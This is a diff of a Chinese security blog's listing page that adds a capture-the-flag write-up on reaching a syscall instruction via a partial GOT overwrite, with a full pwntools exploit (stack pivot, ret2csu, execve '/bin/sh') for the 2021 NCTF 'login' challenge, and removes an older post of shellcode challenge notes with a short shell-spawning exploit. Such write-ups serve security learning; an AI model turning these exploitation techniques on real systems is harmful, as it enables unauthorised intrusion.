@@ -155,6 +155,84 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/22/ret2-libcsyscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/22/ret2-libcsyscall/" class="post-title-link" itemprop="url">ret2_libcsyscall</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-02-22 02:25:04 / 修改时间：03:03:16" itemprop="dateCreated datePublished" datetime="2022-02-22T02:25:04+08:00">2022-02-22</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>以 2.27 的 libc 版本为例，在如下函数的某处偏移中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;read + 15&gt;		syscall</span><br><span class="line">&lt;write + 18&gt;	syscall</span><br><span class="line">&lt;open64 + 76&gt;	syscall</span><br><span class="line">&lt;alarm + 5&gt;		syscall</span><br><span class="line">&lt;close + 18&gt;	syscall</span><br></pre></td></tr></table></figure>
+
+<p>这些函数的这些位置调用的就是<code>syscall</code>这个指令，如果能将某些函数的got修改为这些函数的这些位置就得到了syscall指令，而且由于 ASLR 对 libc 的随机化不会影响其最低12位（即最低3位16进制数），所以有时候当某个函数的 got 表跟其函数内部的 syscall 指令地址只有一个字节相差的时候，我们可以直接修改掉最低一字节即可，连爆破都不用。（好像都是只差一个字节）</p>
+<p>这个方法可以用在当我们需要构造 syscall 而程序中没有现存的 syscall 指令的时候。</p>
+<h3 id="2021NCTF-login"><a href="#2021NCTF-login" class="headerlink" title="2021NCTF-login"></a>2021NCTF-login</h3><p>例行保护</p>
+<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-checksec.jpg" class>
+
+<p>程序主逻辑如下</p>
+<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-main.png" class>
+
+<p>程序很简单，只有一个 0x10 字节长度的溢出，所以当然想到栈迁移到 .bss 段继续我们的构造。同时因为关闭了标准输出和标准错误输出，所以无法泄漏内存。</p>
+<p>那么我们自然会想到，如果无法泄漏内存的话只能我们手动makecall，那么一定会需要 syscall 指令，可惜程序中没有现存的 syscall 指令，那么我们尝试在已经调用了的函数中寻找。</p>
+<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-libcsyscall.jpg" class>
+
+<p>可以看到在 close 函数的 +21 处就是一条 syscall 指令，而且 close 函数在 main 函数中已经调用过，所以我们可以利用 read 函数直接修改其 got 表最低一字节，由此得到一条 syscall 指令。</p>
+<p>由此我们确定思路：将栈迁移到 .bss 段，同时在上面写好我们的ROP，①需要在已知地址写入’/bin/sh‘作参数。②需要修改 close 函数的 got 表得到 syscall 指令。③ makecall调用execve。</p>
+<p>细节慢慢调即可，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"></span><br><span class="line">csu_addr = <span class="number">0x40128A</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">call_addr,rdi,rsi,rdx</span>):</span></span><br><span class="line">	payload = p64(<span class="number">0</span>)  <span class="comment">#rbx</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">	payload += p64(rdi) <span class="comment">#r12</span></span><br><span class="line">	payload += p64(rsi) <span class="comment">#r13</span></span><br><span class="line">	payload += p64(rdx) <span class="comment">#r14</span></span><br><span class="line">	payload += p64(call_addr) <span class="comment">#r15</span></span><br><span class="line">	payload += p64(<span class="number">0x401270</span>) <span class="comment">#ret</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#padding</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">read = <span class="number">0x4011ED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(bss + <span class="number">0x300</span>) + p64(read)</span><br><span class="line">p.sendafter(<span class="string">&quot;Welcome to NCTF2021!&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#write to bss+0x200</span></span><br><span class="line">payload = p64(<span class="number">0x40128A</span>) + csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,elf.got[<span class="string">&#x27;close&#x27;</span>],<span class="number">1</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bss+<span class="number">0x400</span>,<span class="number">59</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;close&#x27;</span>],bss+<span class="number">0x400</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss+<span class="number">0x1f8</span>) + p64(<span class="number">0x40121F</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x85&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/13/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1139,113 +1217,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/shellcode/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/17/shellcode/" class="post-title-link" itemprop="url">shellcode</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-17 20:22:47" itemprop="dateCreated datePublished" datetime="2021-12-17T20:22:47+08:00">2021-12-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-13 17:03:17" itemprop="dateModified" datetime="2022-03-13T17:03:17+08:00">2022-03-13</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6645#toc-5">shellcode 的艺术 - 先知社区 (aliyun.com)</a></p>
-<p>这篇文章主要用来收集做题时关于shellcode的问题</p>
-<h4 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h4><p>该题利用 alpha3 来生成可见字符shellcode来绕过限制，详细见：<a target="_blank" rel="noopener" href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#alpha3">纯字符shellcode生成指南 | TaQini</a></p>
-<p>程序保护如下，栈段是可执行的</p>
-<img src="/2021/12/17/shellcode/msr_checksec.jpg" class>
-
-<p>该题的main函数无法反汇编，所以就着汇编审</p>
-<img src="/2021/12/17/shellcode/msr_main.jpg" class>
-
-<p>可以看到开辟了 0x410 个字节的栈空间，然后往 buf 处输入最多 0x400 个字节，所以没有溢出。然后将 rax 的值与0进行比较，即将 read() 读取的字节数与0进行比较 ，如果大于0则跳转到 <code>loc_11AC</code>，否则跳转到 <code>locret_1254</code></p>
-<img src="/2021/12/17/shellcode/msr_11AC.jpg" class>
-
-<img src="/2021/12/17/shellcode/msr_1254.jpg" class>
-
-<p>可见<code>locret_1254</code> 用来结束程序，<code>loc_11AC</code> 处将0赋给 var_4 之后跳转到 <code>loc_123A</code> ,如下</p>
-<img src="/2021/12/17/shellcode/msr_123A.jpg" class>
-
-<p>可以看到此处将 var_4 和 var_8 进行比较，若 var_4 小于 var_8 则跳转到 <code>loc_11B8</code> 处，由前文我们知道 var_4 为0，var_8 一定大于0，所以这里会进行跳转。</p>
-<img src="/2021/12/17/shellcode/msr_11B8.jpg" class>
-
-<img src="/2021/12/17/shellcode/msr_11FC.jpg" class>
-
-<p>从 11B8-12AC 这一段汇编我们可以知道其是检查我们的输入是否在 <code>(60,74)||(2f,5a)</code>(大概）的范围里，如果不是则跳转到 1254 处结束程序，如果符合则跳转到 1236 处将 var_4 +1 以此进入一个循环，直到将我们的输入的每一位都检查完后会在 123A 处 <code>call rax</code> 也就是执行我们的输入，到这里我们的思路就很明确了，只要我们输入一段满足其输入限制的shellcode 就可以了。然后用 alpha3 生成即可</p>
-<h4 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h4><p>main() 函数如下</p>
-<img src="/2021/12/17/shellcode/sbs_main.jpg" class>
-
-<p>sub_400786() 函数如下</p>
-<img src="/2021/12/17/shellcode/sbs_400786.jpg" class>
-
-<p>可见在 main() 函数中我们可以直接往用 mmap 开辟出来的一段空间中写入一段内容，最后会直接执行这段内容，显然我们可以直接输入shellcode来getshell。但在执行前 sub_400786() 函数对我们的输入进行检查，即输入的每一位都必须是 unk_400978 中的字符，我们查看 unk_400978 中的内容</p>
-<img src="/2021/12/17/shellcode/sbs_400978.jpg" class>
-
-<p>显然我们想直接构造出符合条件的shellcode是比较困难的，但是如果可以让shellcode的前面加上 ‘\x00’ 开头的一段机器码，且这段机器码不会影响shellcode的执行，那么就可以pass掉整段检查过程。可用的机器码有 <code>\x00B\x22</code>、<code>\x00B\x00</code> 等</p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26268</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;plz:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00B\x00&#x27;</span>+asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h4 id="2021强网杯-shellcode"><a href="#2021强网杯-shellcode" class="headerlink" title="2021强网杯-shellcode"></a>2021强网杯-shellcode</h4><p>在这里我们要先知道，程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs = 0x33代表64位模式，而cs寄存器就是通过上面提到的<code>retfq</code>汇编指令来修改</p>
-<p>retfq有两步操作，<code>ret</code>以及<code>set cs</code>，所以执行retfq会跳转到rsp同时将cs设置为[rsp+0x8]，我们只需要事先在ret位置写入32位的shellcode就可以执行了，但是这里有一点需要注意的是，retfq跳转过去的时候程序已经切换成了32位模式，所以地址解析也是以32位的规则来的，所以原先的<code>rsp = 0x7ffe530d01b8</code>会被解析成<code>esp = 0x530d01b8</code></p>
-<p>因为call的是rbx，所以rbx中存储着shellcode执行的起始地址，将rbx pop 给rax，就可以用rax+偏移来得到push rdx;pop rdx;指令的地址，进而进行异或处理（其实不是很懂为什么不直接用rbx做基址）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1311,7 +1286,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-count">61</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
